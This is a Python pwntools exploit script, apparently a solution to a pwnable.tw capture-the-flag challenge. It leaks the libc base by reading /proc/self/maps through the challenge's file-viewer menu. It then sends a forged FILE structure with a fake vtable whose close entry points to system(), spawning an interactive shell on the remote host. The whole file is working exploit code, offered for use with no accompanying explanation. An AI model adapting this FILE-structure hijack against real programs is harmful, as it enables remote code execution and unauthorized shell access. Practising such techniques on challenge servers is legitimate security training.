###fake IO file structure

from pwn import *

###Utils
def newfile(fname):
    r.sendlineafter('choice :','1')
    r.sendlineafter('see :',fname)

def readfile():
    r.sendlineafter('choice :','2')

def showfile():
    r.sendlineafter('choice :','3')
    result = r.recvuntil('--------')[:-8].strip().decode('utf-8')
    return result

def closefile():
    r.sendlineafter('choice :','4')

def getshell(payload):
    r.sendlineafter('choice :','5')
    r.sendlineafter('name :',payload)
    r.interactive()

###Useful_addr
#  libc2.23
buffer_addr = 0x804b260
fp_addr = 0x804b280
system_offset = 0x3a940

r = remote('chall.pwnable.tw',10200)
newfile('/proc/self/maps')
vmmap = ''
for i in range(2):
    readfile()
    vmmap += showfile()
libc_base = int(vmmap.split('\n')[5].split('-')[0],16)

payload = (b'\xff\xff\xff\xff;sh;').ljust(fp_addr-buffer_addr,b'\x00')+p32(buffer_addr) #set file_struct_offset to buffer_addr
payload = payload.ljust(0x94,b'\x00')   #pad_until_vtable_addr
payload+= p32(buffer_addr+0x98)   #specify vtable_addr
payload+= b'\x00'*17*4+p32(system_offset+libc_base) #fill vtable close_func_entry to system
getshell(payload)
